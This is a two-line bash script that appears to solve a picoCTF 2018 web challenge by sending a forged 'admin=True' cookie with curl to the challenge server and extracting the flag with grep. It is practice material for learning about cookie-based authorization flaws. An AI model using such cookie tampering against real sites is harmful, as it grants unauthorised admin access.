#!/bin/bash

curl -s --cookie "admin=True" http://2018shell.picoctf.com:6153/flag | grep -o -E "picoCTF\{[a-zA-Z0-9_]*\}"